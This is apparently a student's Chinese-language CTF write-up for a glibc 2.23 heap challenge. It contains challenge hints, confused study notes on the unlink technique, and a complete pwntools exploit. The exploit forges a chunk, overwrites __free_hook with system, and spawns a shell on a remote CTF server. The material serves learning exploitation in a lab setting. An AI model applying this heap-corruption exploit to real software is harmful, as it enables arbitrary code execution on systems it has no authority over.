>为什么我写不出来啊为什么啊
>
> 保护情况：
> 
> Arch:       amd64-64-little
>
> RELRO:      Partial RELRO
>
> Stack:      Canary found
>
> NX:         NX enabled
>
> PIE:        No PIE (0x3fe000)
>
> Stripped:   No
>
> libc版本：2.23
>
> 题型：unlink
>
> hint：本题用unlink攻击elf上的heaplist可以拿到任意读写
>
> hint：通过malloc正常获得的指针指向fd的位置，该指针存储在pie上的heaplist结构体内。而对于unsorted bins的双链表结构，其fd和bk指向的位置为堆块头部，相差0x10。如果我们要构造unlink攻击，我们应该尝试布置heaplist里的指针指向一个伪造的chunk头部而不是一个chunk的fd字段。当一个堆块的prev_inuse被设置为0时，这个堆块被释放的时候就会根据prev_size尝试与之前的堆块合并。设置好prev_size，size的大小，并构造fd、bk（指向heaplist内指针-0x18和-0x10处）使得堆块沿着fd->bk和bk->fd可以回到自己（绕过检查），接下来堆块进行unlink解链操作，导致heaplist内出现自指指针，此时直接edit和show就可以拿到任意读写。

### 解题思路

这个是一个unlink

我说这个unlink真的有点烦的虽然其实我还是没太搞懂我咋写出来的（懂一半吧）

我申请了一个size0的chunk，没啥用，但是很好玩（其实是忘记删了就这样吧）

嗯就是伪造一个和bss表上的chunk[]指向的地址一样的chunk

然后对这个chunk进行unlink操作

然后还要记得伪造后面一个chunk的prev size

我去我知道为什么那些unlink文章这么诡异了

我也捋不清楚啊

就是伪造一个假的chunk,但是要伪造得特别真

嗯

然后就可以让伪造的fd和bk都变得特别真

然后就能unlink往fd+0x18 bk+0x10的地方

写啥来着。写fd还是bk

不管了（（
反正试几下就能试出来是哪里写到哪里了

对然后就拿到任意写了

好耶！

### exp

```
from pwn import*
filename = './chal'
libc = './libc-2.23.so'

e = ELF(filename)
libc = ELF(libc)
context(arch=e.arch,os=e.os)
context.log_level = 'debug'

sla = lambda x,s:p.sendlineafter(x,s)
sl = lambda s:p.sendline(s)
sa = lambda x,s:p.sendafter(x,s)
s = lambda s:p.send(s)

p = process(filename)
# gdb.attach(p)
p = remote('x.ctf.neuqcsa.cn',33013)

def free(a):
    sla(b'> ',b'4')
    sla(b'Index: ',str(a))  

def show(a):
    sla(b'> ',b'2')
    sla(b'Index: ',str(a))  

def add(a,b,c):
    sla(b'> ',b'1')
    sla(b'Index: ',str(a))
    sla(b'Size: ',str(b))
    sa(b'Content: ',c)

def edit(a,b):
    sla(b'> ',b'3')
    sla(b'Index: ',str(a))
    sla(b'Content: ',b) 

add(0,0x110,b'\n')

add(1,0x140,b'\n')

free(0)
add(2,0x112,b'\n')

show(2)
# pause()
p.recvuntil(b'Content: ')
libca = p.recv(6)
a_libc = u64(libca.ljust(8))
a_libc = a_libc - 0x3c4b00
a_libc = a_libc - 0x2020000000000000

free_hook = a_libc + 0x3c67a8
system = a_libc + 0x453a0

# payload = p64(0x6024a0-0x18)+p64(0x6024a0-0x10)
payload =  p64(0x0)+p64(0x110)
payload += p64(0x6024b0-0x18)+p64(0x6024b0-0x10)
payload += b'a'*0xf0
payload += b'\x10'
payload += b'\x01'
free(0)

sla(b'> ',b'1')
sla(b'Index: ',str(3))
sla(b'Size: ',str(0))

add(4,20,b'/bin/sh\x00\n')
add(5,20,b'\n')
# pause()
edit(2,payload)

# pause()
free(1)


payload = p64(free_hook)
payload+= p64(free_hook)
# payload+= p64(0)
payload+= p64(free_hook)
payload+= p64(free_hook)
payload+= p64(free_hook)
payload+= p64(free_hook)
payload+= p64(free_hook)
payload+= p64(free_hook)
edit(2,payload)

# payload+= b'\x00'*0x138
# payload+= p64(0)

payload = p64(system)

edit(5,payload)
payload = b'/bin/sh\x00'
edit(4,payload)

free(4)

p.interactive()
```

### 文章阅读及笔记
#### [文章一（来自题干）（不是该题知识点）](https://arttnba3.cn/2022/08/30/HARDWARE-0X00-PCI_DEVICE/)

#### [文章二（qwmu逃逸入门）（不是该题知识点）](https://ctf-wiki.org/pwn/virtualization/qemu/exploitation/intro/)

#### [文章三（ctfwiki unlink）](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unlink/)

我看不懂这段啊

    glibc 判断这个块是 small chunk
    判断前向合并，发现前一个 chunk 处于使用状态，不需要前向合并
    判断后向合并，发现后一个 chunk 处于空闲状态，需要合并
    继而对 Nextchunk 采取 unlink 操作

**目的是把一个双向链表中的空闲块拿出来**
所以并不是一定要free合并是吗，只要能把free掉的块拿出来用就行了

    FD=P->fd = target addr -12    //把 fake chunk 的 fd 指针，伪造成 target_addr - bk_offset
    BK=P->bk = expect value    //把 bk 直接设成你想“写进去的值”
    FD->bk = BK，即 *(target addr-12+12)=BK=expect value
    BK->fd = FD，即 *(expect value +8) = FD = target addr-12

*看不懂啊，这一段老是看不懂*

呃大概是这个意思（？）

    *(target) = value;
    *(value + 0x10) = target - 0x18;

**条件 ¶**

    UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针
    
    已知位置存在一个指针指向可进行 UAF 的 chunk

**效果 ¶**

使得已指向 UAF chunk 的指针 ptr 变为 ptr - 0x18

**思路 ¶**

设指向可 UAF chunk 的指针的地址为 ptr

    修改 fd 为 ptr - 0x18
    修改 bk 为 ptr - 0x10
    触发 unlink

ptr 处的指针会变为 ptr - 0x18。

#### [文章四（“一道题彻底理解pwn heap unlink”）](https://cloud.tencent.com/developer/article/1557872)

unlink是一个宏操作，用于将某一个空闲 chunk 从其所处的双向链表中脱链，

我们来利用unlink 所造成的漏洞时，其实就是对进行 unlink chunk 进行内存布局，然后借助 unlink 操作来达成修改指针的效果

设指向可 UAF chunk 的指针的地址为 ptr

    修改 fd 为 ptr - 0x18
    修改 bk 为 ptr - 0x10
    触发 unlink

ptr 处的指针会变为 ptr - 0x18。

#### [文章五（“堆学习：unlink attack”）](https://bbs.kanxue.com/thread-289464.htm)

感觉好像有点懂了（存疑）


### 草稿

好烦啊为啥签到题的ida那么丑，看到这道题的ida之后觉得签到题的ida愈发丑陋了

发现了malloc_hook，这个题是2.23,malloc_hook和free_hook还没有删

清空了大小但是没有清空指针

啥叫伪造一个prev chunk啊

有点完蛋

**free() 会对“被 free 的 chunk 自己”做 unlink**

啥意思

**fastbin<=0x80**

完了卡住了

没搞懂unlink的执行逻辑


